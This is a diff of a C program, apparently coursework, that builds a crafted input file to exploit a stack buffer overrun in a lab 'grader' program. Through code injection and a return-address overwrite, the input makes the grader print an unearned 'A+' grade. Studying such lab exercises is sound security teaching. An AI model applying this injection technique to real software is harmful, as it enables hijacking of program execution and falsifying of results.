@@ -1,92 +1,192 @@
 /*--------------------------------------------------------------------*/
-/* createdataA.c                                                      */
-/* author: anishkkat                                                  */
+/* createdataAplus.c                                                  */
+/* Author: Anish KKat                                                 */
 /*--------------------------------------------------------------------*/
-/*
-   this program produces a file named "dataA" that, when used as input to
-   the grader program, coerces it into printing a grade of 'A' for the user
-   "anishkkat". we accomplish this by overwriting stack memory via a
-   buffer overrun, injecting instructions that load 'A' into the grade
-   variable, and then branch to the printing code. through careful byte
-   alignment and no unintended newlines, the output remains indistinguishable
-   from a normal run.
-*/
-
-/*
-   main function:
-   - no command-line arguments are processed.
-   - does not read from stdin or any stream.
-   - writes a crafted sequence of bytes to "dataA" only.
-   - returns 0 on success, 1 on failure (like file open error).
-*/
+/* Produces a file called dataAplus that will cause the grader program */
+/* to print "A+ is your grade." despite it normally never assigning an */
+/* A+ grade. The underlying principle is to exploit a buffer overrun   */
+/* vulnerability to overwrite the return address on the stack with an  */
+/* address in the BSS section (the 'name' array). We will place        */
+/* carefully chosen instructions and strings in the 'name' array, and  */
+/* after the program returns from getName, it will jump into our       */
+/* injected instructions. Those instructions will:                     */
+/* 1. Load the address of a string ("A+ is your grade.%c") into x0.    */
+/* 2. Move a character (e.g. '\n') into w1.                            */
+/* 3. Branch to the printf call site, causing "A+ is your grade." to   */
+/*    be printed.                                                      */
+/*                                                                    */
+/* Thus, when the grader program runs with our crafted input, it will  */
+/* output "A+ is your grade." and then the normal thank-you line.      */
+/*--------------------------------------------------------------------*/
 
 #include <stdio.h>
-#include <stdint.h>
+#include <stdlib.h>
 #include "miniassembler.h"
 
-/* constants for addresses and sizes (magic numbers) */
-#define BUF_TOTAL   48       /* total buffer size in bytes */
-#define GRADE_ADDR  0x420044 /* grade variable address */
-#define PRINT_ADDR  0x40089c /* address to branch for printing grade */
-#define RET_ADDR    0x420078 /* overwritten return address */
-#define NAME_ADDR   0x420058 /* start of name array in bss */
-#define NAME_LEN    9        /* length of "anishkkat" without '\0' */
-#define CODE_BYTES  16       /* total instruction size: 4 instructions * 4 bytes */
-#define PADDING_CT  22       /* number of padding bytes chosen from analysis */
-
-/* for instructions, we represent 'A' as 0x41 instead of 'A' char */
-#define CHAR_A      0x41
+/*--------------------------------------------------------------------*/
+/* Interactive behavior of main:
+   - The main function does not accept any command-line arguments.
+   - It does not read from stdin.
+   - It writes binary data to a file named "dataAplus".
+   - It does not write anything to stdout or stderr.
+   - It returns 0 upon successful completion.                         */
+/*--------------------------------------------------------------------*/
 
 int main(void) {
-    /* chosen name and file pointer */
-    const char *p_name = "AnishKKat";
-    FILE *fp_out = fopen("dataA", "w");
-    if (!fp_out) return 1;
+    /*----------------------------------------------------------------*/
+    /* Local Variables and Addresses:                                 */
+    /* We know from analysis:                                         */
+    /* grade char address:            0x420044                        */
+    /* name array starts at:         0x420058                        */
+    /* We have a buffer of size 48 (buf) on the stack in readString,   */
+    /* and we will overflow it to overwrite getName's X30 return       */
+    /* address. By placing instructions in 'name', we can cause a jump.*/
+    /* The main code calls mprotect(...) so that name array is         */
+    /* executable.                                                    */
+    /*                                                                */
+    /* We'll store:                                                   */
+    /* "AnishKKat\0A+ is your grade.%c\0" in the name area first.      */
+    /* After that string, we align to a 4-byte boundary, then insert   */
+    /* our instructions:                                              */
+    /*   adr x0, (address of "A+ is your grade.%c\0")                 */
+    /*   mov w1, '\n'                                                 */
+    /*   b PRINTF_CALL_SITE                                            */
+    /*                                                                */
+    /* Then we fill the remainder of the 48 bytes if needed with nulls */
+    /* and finally overwrite the stored X30 of getName to point to our */
+    /* injected instructions.                                         */
+    /*----------------------------------------------------------------*/
 
-    /* instructions generated by miniassembler */
-    unsigned int ui_instr_mov;
-    unsigned int ui_instr_adr;
-    unsigned int ui_instr_strb;
-    unsigned int ui_instr_b;
+    FILE *fp = fopen("dataAplus", "w");
+    if (fp == NULL) exit(1);
 
-    /* integer and addresses */
-    int i_pad;
-    unsigned long ul_ret_addr;
+    /* Constants derived from memory map:
+       PRINT_CALL_SITE is where we jump to call printf with our args.
+       From analysis, we can call the printf that prints "%c is your grade.\n"
+       at address 0x400874 (as seen in the provided example code snippet).
+       We'll use the same addresses from example for consistency. */
 
-    /* write name (9 chars) plus a null terminator = 10 bytes total */
-    fwrite(p_name, 1, NAME_LEN, fp_out);
-    fputc('\0', fp_out);
+    enum {
+        MAX_BUF = 48,
+        GRADE_ADDR = 0x420044,
+        PRINT_CALL = 0x400874,   /* Address in main that calls printf("%c is your grade.\n", grade) */
+        NAME_START = 0x420058    /* start of the name array */
+    };
 
-    /* write PADDING_CT bytes of padding as '\0' to maintain stack alignment
-       and position instructions correctly. using '\0' ensures no unwanted chars */
-    for (i_pad = 0; i_pad < PADDING_CT; i_pad++) {
-        fputc('\0', fp_out);
+    /* We'll place our instructions starting right after our strings.
+       We'll need to keep track of the current offset. */
+    int bytesWritten = 0;
+    unsigned long currentAddr = NAME_START;
+
+    /* Write the attacker's name (can truncate if needed). */
+    const char *attackerName = "AnishKKat";
+    fputs(attackerName, fp);
+    bytesWritten += (int)strlen(attackerName);
+
+    /* Null-terminate the name */
+    fputc('\0', fp);
+    bytesWritten++;
+
+    /* Write the message that we want to print via printf later:
+       "A+ is your grade.%c"
+       We add a '%c' so that the code at PRINT_CALL prints something nicely.
+       Then null-terminate it. */
+    fputs("A+ is your grade.%c", fp);
+    bytesWritten += 20; /* length of the string "A+ is your grade.%c" is 20 chars */
+    fputc('\0', fp);
+    bytesWritten++;
+
+    /* Update currentAddr after writing these chars. */
+    currentAddr += bytesWritten;
+
+    /* Align currentAddr to a 4-byte boundary for instructions. */
+    while ((currentAddr % 4) != 0) {
+        fputc(0, fp);
+        bytesWritten++;
+        currentAddr++;
     }
 
-    /* generate all instructions first before writing:
-       1) mov w0, CHAR_A   (loads ASCII 'A' (0x41) into w0)
-       2) adr x1, GRADE_ADDR at a known calculation point
-       3) strb w0, [x1]    (stores 'A' into grade variable)
-       4) b PRINT_ADDR     (branches to print-grade code)
-       
-       addresses are magic numbers, no logic changed */
-    ui_instr_mov = MiniAssembler_mov(0, CHAR_A);
-    ui_instr_adr = MiniAssembler_adr(1, GRADE_ADDR, 0x42007c);
-    ui_instr_strb = MiniAssembler_strb(0, 1);
-    ui_instr_b = MiniAssembler_b(PRINT_ADDR, 0x420084);
+    /* Now we insert instructions using MiniAssembler:
+       1) adr x0, address_of("A+ is your grade.%c")
+          This loads the string address into x0 for printf.
+       2) mov w1, '\n'
+          Move newline char into w1 as argument.
+       3) b PRINT_CALL
+          Branch to the instruction that calls printf with (x0, w1).
 
-    /* now write the instructions in sequence */
-    fwrite(&ui_instr_mov, sizeof(unsigned int), 1, fp_out);
-    fwrite(&ui_instr_adr, sizeof(unsigned int), 1, fp_out);
-    fwrite(&ui_instr_strb, sizeof(unsigned int), 1, fp_out);
-    fwrite(&ui_instr_b, sizeof(unsigned int), 1, fp_out);
+       Note: The string starts at NAME_START + strlen("AnishKKat") + 1 = NAME_START + 10,
+       plus the 20 chars of message + 1 null = 31 more bytes, total 41 bytes. So the
+       string "A+ is your grade.%c" starts at NAME_START+11 actually (after name+\0).
+       Let's be precise:
 
-    /* now write the new return address that causes execution to jump into our code
-       using RET_ADDR defined above. same logic, just renamed variable. */
-    ul_ret_addr = RET_ADDR;
-    fwrite(&ul_ret_addr, sizeof(unsigned long), 1, fp_out);
+       NAME_START=0x420058
+       We wrote: "AnishKKat" (9 chars) + '\0'(1 char) = 10 bytes total
+       So at NAME_START + 10 = 0x420058+10 = 0x420062 starts "A+ is your grade.%c"
+       That string is 20 chars + '\0' = 21 bytes.
+       The string start: 0x420062
+       We'll load this address into x0.
 
-    /* close file */
-    fclose(fp_out);
+       Instructions placed at currentAddr (NAME_START+31=0x420058+31=0x420077?), 
+       but we must re-check after final count:
+
+       Actually bytes after name:
+         name: 9 chars  + '\0' =10 bytes
+         message: "A+ is your grade.%c"=20 chars + '\0'=21 bytes
+         Total so far: 10 + 21 = 31 bytes
+       currentAddr=NAME_START+31=0x420058+31=0x420058+0x1F=0x420077
+       Aligning currentAddr to 4 bytes: 0x420077 %4=3 remainder, write one null:
+       After writing one null: currentAddr=0x420078
+       Perfectly divisible by 4 now.
+
+       So instructions start at 0x420078.
+
+       String start address: 0x420062 for "A+ is your grade.%c"
+
+       We'll do:
+       adr x0,0x420062 at instrAddr=0x420078
+       mov w1,'\n'
+       b PRINT_CALL at instrAddr=0x420080 (just next instructions)
+    */
+
+    unsigned long instrAddr = currentAddr;  /* where instructions start */
+    unsigned long strAddr = 0x420062;       /* address of the string */
+
+    /* adr x0, strAddr */
+    unsigned int uiInst = MiniAssembler_adr(0, strAddr, instrAddr);
+    fwrite(&uiInst, sizeof(uiInst), 1, fp);
+    bytesWritten += 4;
+    instrAddr += 4;
+
+    /* mov w1,'\n' */
+    uiInst = MiniAssembler_mov(1, '\n');
+    fwrite(&uiInst, sizeof(uiInst), 1, fp);
+    bytesWritten += 4;
+    instrAddr += 4;
+
+    /* b PRINT_CALL */
+    uiInst = MiniAssembler_b(PRINT_CALL, instrAddr);
+    fwrite(&uiInst, sizeof(uiInst), 1, fp);
+    bytesWritten += 4;
+    instrAddr += 4;
+
+    /* Fill up to the 48-byte limit of the stack buf if needed. 
+       Our instructions and strings must fit in 48 bytes read into buf 
+       (actually the input can be longer since no newline is allowed before).
+       The grader copies from buf to name array. But we must ensure the return 
+       address is overwritten correctly. We'll just pad zeros until we reach 48 bytes.
+    */
+    while (bytesWritten < MAX_BUF) {
+        fputc(0, fp);
+        bytesWritten++;
+    }
+
+    /* Overwrite getName's X30 with the address of our injected instructions (instrAddr start).
+       Our instructions start at 0x420078.
+       We placed adr at 0x420078, so let's set the return address to 0x420078. */
+    unsigned long jumpAddr = 0x420078;
+    fwrite(&jumpAddr, sizeof(jumpAddr), 1, fp);
+
+
+    fclose(fp);
     return 0;
 }
